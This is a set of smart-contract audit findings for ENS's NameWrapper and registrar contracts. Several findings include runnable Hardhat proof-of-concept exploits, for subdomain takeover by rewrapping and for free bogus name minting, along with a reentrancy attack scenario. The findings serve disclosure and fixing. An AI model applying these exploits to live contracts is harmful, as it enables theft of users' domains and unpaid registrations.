# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/ERC1155Fuse.sol#L274-L284   # Vulnerability details  ## Impact  MED - the function of the protocol could be impacted  The `safeTransferFrom` does not comply with the ERC1155 standard when the token is sent to the old owner.  ## Proof of Concept  According to the EIP-1155 standard for the `safeTransferFrom`:  > MUST revert if balance of holder for token `_id` is lower than the `_value` sent.   Let's say `alice` does not hold any token of `tokenId`, and `bob` holds one token of `tokenId`. Then alice tries to send one token of `tokenId` to bob with `safeTranferFrom(alice, bob, tokenId, 1, "")`.  In this case, even though alice's balance (= 0) is lower than the amount (= 1) sent, the `safeTransferFrom` will not revert. Thus, violating the EIP-1155 standard. It can cause problems for other contracts using this token, since they assume the token was transferred if the `safeTransferFrom` does not revert. However, in the example above, no token was actually transferred.  ```solidity // https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/ERC1155Fuse.sol#L274-L284 // wrapper/ERC1155Fuse.sol::_transfer // ERC1155Fuse::safeTransferFrom uses _transfer  274     function _transfer( 275         address from, 276         address to, 277         uint256 id, 278         uint256 amount, 279         bytes memory data 280     ) internal { 281         (address oldOwner, uint32 fuses, uint64 expiry) = getData(id); 282         if (oldOwner == to) { 283             return; 284         } ```  ## Tools Used  none  ## Recommended Mitigation Steps  Revert even if the `to` address already owns the token.    
# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L356 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L295 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/registry/ENSRegistry.sol#L74   # Vulnerability details  ### Description  By design, for any subdomain, as long as its `PARENT_CANNOT_CONTROL` fuse is burnt (and does not expire), its parent should not be able to burn its fuses or change its owner.  However, this contraint can be bypassed by a parent node maliciously unwrapping itself. As long as the hacker becomes the ENS owner of the parent node, he can leverage `ENSRegistry::setSubnodeOwner` to re-set himself as the ENS owner of the subdomain, and thus re-invoking `NameWrapper.wrap` can rewrite the fuses and wrapper owner of the given subdoamin.   Considering the following attack scenario:  + Someone owns a domain (or a 2LD), e.g., _poc.eth_ + The domain owner assigns a sub-domain to the hacker, e.g., _hack.poc.eth_      + This sub-domain should not burn `CANNOT_UNWRAP`      + This sub-domain can burn `PARENT_CANNOT_CONTROL` + Hacker assigns a sub-sub-domain to a victim user, e.g., _victim.hack.poc.eth_ + The victim user burns arbitrary fuses, including `PARENT_CANNOT_CONTROL`      + The hacker should not be able to change the owner and the fuses of `victim.hack.poc.eth` ideally + However, the hacker then unwraps his sub-domain, i.e., _hack.poc.eth_ + The hacker invokes `ENSRegistry::setSubnodeOwner(hacker.poc.eth, victim)` on the sub-sub-domain      + He can reassign himself as the owner of the _victim.hack.poc.eth_ + The hacker invokes `NameWrapper.wrap(victim.hacker.poc.eth)` to over-write the fuses and owner of the sub-sub-domain, i.e., _victim.hacker.poc.eth_  The root cause here is that, for any node, when one of its subdomains burns `PARENT_CANNOT_CONTROL`, the node itself fails to burn `CANNOT_UNWRAP`. Theoretically, this should check to the root, which however is very gas-consuming.   ### Notes  Discussed with the project member, Jeff Lau.   If there is any issue running the attached PoC code, please contact me via `izhuer#0001` discord.   ### Suggested Fix  + Potential fix 1: auto-burn `CANNOT_UNWRAP` which thus lets `expiry` decide whether a node can be unwrapped. + Potential fix 2: leave fuses as is when unwrapping and re-wrapping, unless name expires. Meanwhile, check the old fuses even wrapping.   ### PoC / Attack Scenario  There are two attached PoC files, `poc1.js` and `poc2.js`. The `poc1.js` is for a case where the hacker holds a 2LD, and the `poc2.js` demonstrates the aforementioned scenario.  To run the PoC, put then in `2022-07-ens/test/wrapper` and run `npx hardhat test --grep 'PoC'`.   #### poc1.js ```javascript const packet = require('dns-packet') const { ethers } = require('hardhat') const { utils } = ethers const { use, expect } = require('chai') const { solidity } = require('ethereum-waffle') const n = require('eth-ens-namehash') const namehash = n.hash const { deploy } = require('../test-utils/contracts') const { keccak256 } = require('ethers/lib/utils')  use(solidity)  const labelhash = (label) => utils.keccak256(utils.toUtf8Bytes(label)) const ROOT_NODE =   '0x0000000000000000000000000000000000000000000000000000000000000000'  const EMPTY_ADDRESS = '0x0000000000000000000000000000000000000000'  function encodeName(name) {   return '0x' + packet.name.encode(name).toString('hex') }  const CANNOT_UNWRAP = 1 const CANNOT_BURN_FUSES = 2 const CANNOT_TRANSFER = 4 const CANNOT_SET_RESOLVER = 8 const CANNOT_SET_TTL = 16 const CANNOT_CREATE_SUBDOMAIN = 32 const PARENT_CANNOT_CONTROL = 64 const CAN_DO_EVERYTHING = 0  describe('PoC 1', () => {   let ENSRegistry   let BaseRegistrar   let NameWrapper   let NameWrapperV   let MetaDataservice   let signers   let dev   let victim   let hacker   let result   let MAX_EXPIRY = 2n ** 64n - 1n    before(async () => {     signers = await ethers.getSigners()     dev = await signers[0].getAddress()     victim = await signers[1].getAddress()     hacker = await signers[2].getAddress()      EnsRegistry = await deploy('ENSRegistry')     EnsRegistryV = EnsRegistry.connect(signers[1])     EnsRegistryH = EnsRegistry.connect(signers[2])      BaseRegistrar = await deploy(       'BaseRegistrarImplementation',       EnsRegistry.address,       namehash('eth')     )      await BaseRegistrar.addController(dev)     await BaseRegistrar.addController(victim)      MetaDataservice = await deploy(       'StaticMetadataService',       'https://ens.domains'     )      NameWrapper = await deploy(       'NameWrapper',       EnsRegistry.address,       BaseRegistrar.address,       MetaDataservice.address     )     NameWrapperV = NameWrapper.connect(signers[1])     NameWrapperH = NameWrapper.connect(signers[2])      // setup .eth     await EnsRegistry.setSubnodeOwner(       ROOT_NODE,       labelhash('eth'),       BaseRegistrar.address     )      //make sure base registrar is owner of eth TLD     expect(await EnsRegistry.owner(namehash('eth'))).to.equal(       BaseRegistrar.address     )   })    beforeEach(async () => {     result = await ethers.provider.send('evm_snapshot')   })   afterEach(async () => {     await ethers.provider.send('evm_revert', [result])   })    describe('subdomain can be re-wrapped', () => {     before(async () => {       await BaseRegistrar.addController(NameWrapper.address)       await NameWrapper.setController(dev, true)     })      it('a passed test denotes a successful attack', async () => {       const label = 'register'       const labelHash = labelhash(label)       const wrappedTokenId = namehash(label + '.eth')        // register a 2LD domain for the hacker       await NameWrapper.registerAndWrapETH2LD(         label,         hacker,         86400,         EMPTY_ADDRESS,         CAN_DO_EVERYTHING,         MAX_EXPIRY       )       expect(await BaseRegistrar.ownerOf(labelHash)).to.equal(         NameWrapper.address       )       expect(await EnsRegistry.owner(wrappedTokenId)).to.equal(         NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedTokenId)).to.equal(hacker)        // hacker signed a submomain for a victim user       const subLabel = 'hack'       const subLabelHash = labelhash(subLabel)       const wrappedSubTokenId = namehash(subLabel + '.' + label + '.eth')       await NameWrapperH.setSubnodeOwner(         wrappedTokenId,         subLabel,         victim,         PARENT_CANNOT_CONTROL,         MAX_EXPIRY       )       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSubTokenId)).to.equal(victim)       expect(           (await NameWrapper.getFuses(wrappedSubTokenId))[0]       ).to.equal(PARENT_CANNOT_CONTROL)        // the user sets a very strict fuse for the wrappedSubTokenId       await NameWrapperV.setFuses(wrappedSubTokenId, 127 - PARENT_CANNOT_CONTROL) // 63       expect((await NameWrapper.getFuses(wrappedSubTokenId))[0]).to.equal(127)        // the hacker unwraps his 2LD token       await NameWrapperH.unwrapETH2LD(labelHash, hacker, hacker)       expect(await BaseRegistrar.ownerOf(labelHash)).to.equal(hacker)       expect(await EnsRegistry.owner(wrappedTokenId)).to.equal(hacker)        // the hacker setSubnodeOwner       await EnsRegistryH.setSubnodeOwner(wrappedTokenId, subLabelHash, hacker)       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(hacker)        // the hacker re-wrap the sub node       await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)       await NameWrapperH.wrap(           encodeName(subLabel + '.' + label + '.eth'),           hacker,           EMPTY_ADDRESS       )        ///////////////////////////       // Attack successed!       ///////////////////////////        // XXX: [1] the owner of wrappedSubTokenId transfer from the victim to the hacker       // XXX: [2] the fuses of wrappedSubTokenId becomes 0 from full-protected       expect(await NameWrapper.ownerOf(wrappedSubTokenId)).to.equal(hacker)       expect((await NameWrapper.getFuses(wrappedSubTokenId))[0]).to.equal(0)     })   }) }) ```  #### poc2.js ```javascript const packet = require('dns-packet') const { ethers } = require('hardhat') const { utils } = ethers const { use, expect } = require('chai') const { solidity } = require('ethereum-waffle') const n = require('eth-ens-namehash') const namehash = n.hash const { deploy } = require('../test-utils/contracts') const { keccak256 } = require('ethers/lib/utils')  use(solidity)  const labelhash = (label) => utils.keccak256(utils.toUtf8Bytes(label)) const ROOT_NODE =   '0x0000000000000000000000000000000000000000000000000000000000000000'  const EMPTY_ADDRESS = '0x0000000000000000000000000000000000000000'  function encodeName(name) {   return '0x' + packet.name.encode(name).toString('hex') }  const CANNOT_UNWRAP = 1 const CANNOT_BURN_FUSES = 2 const CANNOT_TRANSFER = 4 const CANNOT_SET_RESOLVER = 8 const CANNOT_SET_TTL = 16 const CANNOT_CREATE_SUBDOMAIN = 32 const PARENT_CANNOT_CONTROL = 64 const CAN_DO_EVERYTHING = 0  describe('PoC 2', () => {   let ENSRegistry   let BaseRegistrar   let NameWrapper   let NameWrapperV   let MetaDataservice   let signers   let dev   let victim   let hacker   let result   let MAX_EXPIRY = 2n ** 64n - 1n    before(async () => {     signers = await ethers.getSigners()     dev = await signers[0].getAddress()     victim = await signers[1].getAddress()     hacker = await signers[2].getAddress()      EnsRegistry = await deploy('ENSRegistry')     EnsRegistryV = EnsRegistry.connect(signers[1])     EnsRegistryH = EnsRegistry.connect(signers[2])      BaseRegistrar = await deploy(       'BaseRegistrarImplementation',       EnsRegistry.address,       namehash('eth')     )      await BaseRegistrar.addController(dev)     await BaseRegistrar.addController(victim)      MetaDataservice = await deploy(       'StaticMetadataService',       'https://ens.domains'     )      NameWrapper = await deploy(       'NameWrapper',       EnsRegistry.address,       BaseRegistrar.address,       MetaDataservice.address     )     NameWrapperV = NameWrapper.connect(signers[1])     NameWrapperH = NameWrapper.connect(signers[2])      // setup .eth     await EnsRegistry.setSubnodeOwner(       ROOT_NODE,       labelhash('eth'),       BaseRegistrar.address     )      //make sure base registrar is owner of eth TLD     expect(await EnsRegistry.owner(namehash('eth'))).to.equal(       BaseRegistrar.address     )   })    beforeEach(async () => {     result = await ethers.provider.send('evm_snapshot')   })   afterEach(async () => {     await ethers.provider.send('evm_revert', [result])   })    describe('subdomain can be re-wrapped', () => {     /*      * Attack scenario:      *  + Someone owns a domain (or a 2LD), e.g., poc.eth      *  + The domain owner assigns a sub-domain to the hacker, e.g., hack.poc.eth      *      + This sub-domain should not burn `CANNOT_UNWRAP`      *      + This sub-domain can burn `PARENT_CANNOT_CONTROL`      *  + Hacker assigns a sub-sub-domain to a victim user, e.g., victim.hack.poc.eth      *  + The victim user burns arbitrary fuses, including `PARENT_CANNOT_CONTROL`      *  + The hacker unwraps his sub-domain, i.e., hack.poc.eth      *  + The hacker invokes `ENSRegistry::setSubnodeOwner` on the sub-sub-domain      *      + He can reassign himself as the owner of the victim.hack.poc.eth      *  + The sub-sub-domain is now owned by the hacker with more permissive fuses      */     before(async () => {       await BaseRegistrar.addController(NameWrapper.address)       await NameWrapper.setController(dev, true)     })      it('a passed test denotes a successful attack', async () => {       const label = 'poc'       const labelHash = labelhash(label)       const wrappedTokenId = namehash(label + '.eth')        // register a 2LD domain       await NameWrapper.registerAndWrapETH2LD(         label,         dev,         86400,         EMPTY_ADDRESS,         CAN_DO_EVERYTHING,         MAX_EXPIRY       )       expect(await BaseRegistrar.ownerOf(labelHash)).to.equal(         NameWrapper.address       )       expect(await EnsRegistry.owner(wrappedTokenId)).to.equal(         NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedTokenId)).to.equal(dev)        // signed a submomain for the hacker       const subLabel = 'hack'       const subLabelHash = labelhash(subLabel)       const subDomain = subLabel + '.' + label + '.eth'       const wrappedSubTokenId = namehash(subDomain)       await NameWrapper.setSubnodeOwner(         wrappedTokenId,         subLabel,         hacker,         PARENT_CANNOT_CONTROL,         MAX_EXPIRY       )       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSubTokenId)).to.equal(hacker)       expect(           (await NameWrapper.getFuses(wrappedSubTokenId))[0]       ).to.equal(PARENT_CANNOT_CONTROL)        // hacker signed a subsubmomain for a victim user       const subSubLabel = 'victim'       const subSubLabelHash = labelhash(subSubLabel)       const subSubDomain = subSubLabel + '.' + subDomain       const wrappedSubSubTokenId = namehash(subSubDomain)       await NameWrapperH.setSubnodeOwner(         wrappedSubTokenId,         subSubLabel,         victim,         PARENT_CANNOT_CONTROL,         MAX_EXPIRY       )       expect(await EnsRegistry.owner(wrappedSubSubTokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSubSubTokenId)).to.equal(victim)       expect(           (await NameWrapper.getFuses(wrappedSubSubTokenId))[0]       ).to.equal(PARENT_CANNOT_CONTROL)        // the user sets a very strict fuse for the wrappedSubSubTokenId       await NameWrapperV.setFuses(wrappedSubSubTokenId, 127 - PARENT_CANNOT_CONTROL) // 63       expect((await NameWrapper.getFuses(wrappedSubSubTokenId))[0]).to.equal(127)        // the hacker unwraps his wrappedSubTokenId       await NameWrapperH.unwrap(wrappedTokenId, subLabelHash, hacker)       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(hacker)        // the hacker setSubnodeOwner, to set the owner of wrappedSubSubTokenId as himself       await EnsRegistryH.setSubnodeOwner(wrappedSubTokenId, subSubLabelHash, hacker)       expect(await EnsRegistry.owner(wrappedSubSubTokenId)).to.equal(hacker)          // the hacker re-wrap the sub sub node       await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)       await NameWrapperH.wrap(encodeName(subSubDomain), hacker, EMPTY_ADDRESS)        // ///////////////////////////       // // Attack successed!       // ///////////////////////////        // XXX: [1] the owner of wrappedSubTokenId transfer from the victim to the hacker       // XXX: [2] the fuses of wrappedSubTokenId becomes 0 from full-protected       expect(await NameWrapper.ownerOf(wrappedSubSubTokenId)).to.equal(hacker)       expect((await NameWrapper.getFuses(wrappedSubSubTokenId))[0]).to.equal(0)     })   }) }) ```  
# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L327-L346   # Vulnerability details  ### Impact  The `unwrapETH2LD` use `transferFrom` to transfer ERC721 token, the `newRegistrant` could be an unprepared contract  ### Proof of Concept  Should a ERC-721 compatible token be transferred to an unprepared contract, it would end up being locked up there. Moreover, if a contract explicitly wanted to reject ERC-721 safeTransfers. Plus take a look to [the OZ safeTransfer comments](https://docs.openzeppelin.com/contracts/4.x/api/token/erc721#IERC721-transferFrom-address-address-uint256-);   `Usage of this method is discouraged, use safeTransferFrom whenever possible.`  ### Tools Used  Manual Review  ### Recommended Mitigation Steps  ```diff     function unwrapETH2LD(         bytes32 labelhash,         address newRegistrant,         address newController     ) public override onlyTokenOwner(_makeNode(ETH_NODE, labelhash)) {         _unwrap(_makeNode(ETH_NODE, labelhash), newController); -       registrar.transferFrom( +       registrar.safeTransferFrom(             address(this),             newRegistrant,             uint256(labelhash)         );     } ```  
# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L183-L185 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L204   # Vulnerability details  ## Impact `transfer()` forwards 2300 gas only, which may not be enough in future if the recipient is a contract and gas costs change. it could break existing contracts functionality.  ## Proof of Concept `.transfer` or `.send` method, only 2300 gas will be “forwarded” to fallback function. Specifically, the SLOAD instruction, will go from costing 200 gas to 800 gas.  if any smart contract has a functionality of register ens and it has fallback function which is making some state change in contract on ether receive, it could use more than 2300 gas and revert every transaction  for reference checkout this, https://docs.soliditylang.org/en/v0.8.15/security-considerations.html?highlight=transfer#sending-and-receiving-ether https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/  ## Tools Used Manual Analysis  ## Recommended Mitigation Steps  use `.call` insted `.transfer`       (bool success, ) = msg.sender.call.value(amount)("");      require(success, "Transfer failed.");   
# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L249-L268 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L125 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/BaseRegistrarImplementation.sol#L106   # Vulnerability details  ## Impact Users using the ```register``` function in ```ETHRegistrarController.sol```, can create an additional bogus ENS entry (Keep the ERC721 and all the glory for as long as they want) for free by exploiting the ```functionCall``` in the ```_setRecords``` function. The only check there (in the setRecord function) is that the nodehash matches the originally registered ENS entry, this is extremely dangerous because the rest of the functionCall is not checked and the controller has very elevated privileges in ENS ecosystem (and probably beyond).  The single exploit I am showing is already very bad, but I expect there will be more if this is left in. An example of a potential hack is that some of the functions in other ENS contracts (which give the RegistrarController elevated privilege) have dynamic types as the first variables--if users can generate a hash that is a low enough number, they will be able to unlock more exploits in the ENS ecosystem because of how dynamic types are abi encoded.  Other developers will probably also trust the ```ETHRegistrarController.sol```, so other unknown dangers may come down the road.  The exploit I made (full code in PoC) can mint another ENS entry and keep it for as long as it wants, without paying more--will show code below.  ## Proof of Concept Put this code in the ```TestEthRegistrarController.js``` test suite to run. I just appended this to tests at the bottom of file.   I called the ```BaseRegistrarImplementation.register``` function with the privileges of ```ETHRegistrarController``` by passing the base registrar's address as the ```resolver``` param in the ```ETHRegistrarController.register``` function call. I was able to set a custom duration at no additional cost.   The final checks of the PoC show that we own two new ENS entries from a single ```ETHRegistrarController.register``` call. The labelhash of the new bogus ENS entry is the nodehash of the first registered ENS entry.  ```js   it('Should allow us to make bogus erc721 token in ENS contract', async () => {     const label = 'newconfigname'     const name = `${label}.eth`     const node = namehash.hash(name)     const secondTokenDuration = 788400000 // keep bogus NFT for 25 years;      var commitment = await controller.makeCommitment(       label,       registrantAccount,       REGISTRATION_TIME,       secret,       baseRegistrar.address,       [         baseRegistrar.interface.encodeFunctionData('register(uint256,address,uint)', [           node,           registrantAccount,           secondTokenDuration         ]),       ],       false,       0,       0     )     var tx = await controller.commit(commitment)     expect(await controller.commitments(commitment)).to.equal(       (await web3.eth.getBlock(tx.blockNumber)).timestamp     )      await evm.advanceTime((await controller.minCommitmentAge()).toNumber())     var balanceBefore = await web3.eth.getBalance(controller.address)      let tx2 = await controller.register(       label,       registrantAccount,       REGISTRATION_TIME,       secret,       baseRegistrar.address,       [         baseRegistrar.interface.encodeFunctionData('register(uint256,address,uint)', [           node,           registrantAccount,           secondTokenDuration         ]),       ],       false,       0,       0,       { value: BUFFERED_REGISTRATION_COST }     )      expect(await nameWrapper.ownerOf(node)).to.equal(registrantAccount)     expect(await ens.owner(namehash.hash(name))).to.equal(nameWrapper.address)       expect(await baseRegistrar.ownerOf(node)).to.equal( // this checks that bogus NFT is owned by us       registrantAccount     )     expect(await baseRegistrar.ownerOf(sha3(label))).to.equal(       nameWrapper.address     )   }) ```  ## Tools Used chai tests in repo  ## Recommended Mitigation Steps I recommend being stricter on the signatures of the user-provided ```resolver``` and the function that is being called (like safeTransfer calls in existing token contracts). An example of how to do this is by creating an interface that ENS can publish for users that want to compose their own resolvers and call that instead of a loose functionCall. Users will be free to handle data however they like, while restricting the space of things that can go wrong.  I will provide a loose example here: ``` interface IUserResolver {     function registerRecords(bytes32 nodeId, bytes32 labelHash, bytes calldata extraData)  } ```  
# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L820-L821 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L524 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L572   # Vulnerability details  ## Impact  Due to re-entrancy possibility in `NameWrapper._transferAndBurnFuses` (called from `setSubnodeOwner` and `setSubnodeRecord`), it is possible to do some stuff in `onERC1155Received` right after transfer but before new owner and new fuses are set. This makes it possible, for example, to unwrap the subdomain, but owner and fuses will still be set even for unwrapped domain, creating fake `ERC1155` `NameWrapper` token for domain, which is not owned by `NameWrapper`.  Fake token creation scenario:  1. `Account1` registers and wraps `test.eth` domain 2. `Account1` calls `NameWrapper.setSubnodeOwner` for `sub.test.eth` subdomain with `Account1` as owner (to make NameWrapper owner of subdomain) 3. `Contract1` smart contract is created, which calls unwrap in its `onERC1155Received` function, and a function to send `sub.test.eth` ERC1155 NameWrapper token back to `Account1` 4. `Account1` calls `NameWrapper.setSubnodeOwner` for `sub.test.eth` with `Contract1` as new owner, which unwraps domain back to `Account1` but due to re-entrancy, NameWrapper sets fuses and ownership to `Contract1` 5. `Account1` calls function to send ERC1155 token from `Contract1` back to self.  After this sequence of events, `sub.test.eth` subdomain is owned by `Account1` both in `ENS` registry and in `NameWrapper` (with fuses and expiry correctly set to the future date). Lots (but not all) of functions in `NameWrapper` will fail to execute for this subdomain, because they expect `NameWrapper` to have ownership of the domain in `ENS`, but some functions will still work, making it possible to make the impression of good domain.  At this point, ownership in `NameWrapper` is "detached" from ownership in `ENS` and `Account1` can do all kinds of malcious stuff with its ERC1155 token. For example:  1. Sell subdomain to the other user, transfering `ERC1155` to that user and burning `PARENT_CANNOT_CONTROL` to create impression that he can't control the domain. After receiving the payment, `Account1` can wrap the domain again, which burns existing ownership record and replaces with the new one with clear fuses and `Account1` ownership, effectively stealing domain back from unsuspecting user, who thought that `ERC1155` gives him the right to the domain (and didn't expect that parent can clear fuses when `PARENT_CANNOT_CONTROL` is set).  2. Transfer subdomain to some other smart contract, which implements `onERC1155Received`, then take it back, fooling smart contract into believing that it has received the domain.   ## Proof of Concept  Copy these to test/wrapper and run: yarn test test/wrapper/NameWrapperReentrancy.js  https://gist.github.com/panprog/3cd94e3fbb0c52410a4c6609e55b863e   ## Recommended Mitigation Steps  Consider adding `nonReentrant` modifiers with `ReentrancyGuard` implementation from `openzeppelin`. Alternatively just fix this individual re-entrancy issue. There are multiple ways to fix it depending on expected behaviour, for example saving `ERC1155` data and requiring it to match the data after transfer (restricting `onERC1155Received` to not change any data for the token received):      function _transferAndBurnFuses(         bytes32 node,         address newOwner,         uint32 fuses,         uint64 expiry     ) internal {         (address owner, uint32 saveFuses, uint64 saveExpiry) = getData(uint256(node));         _transfer(owner, newOwner, uint256(node), 1, "");         uint32 curFuses;         uint64 curExpiry;         (owner, curFuses, curExpiry) = getData(uint256(node));         require(owner == newOwner && saveFuses == curFuses && saveExpiry == curExpiry);         _setFuses(node, newOwner, fuses, expiry);     }   
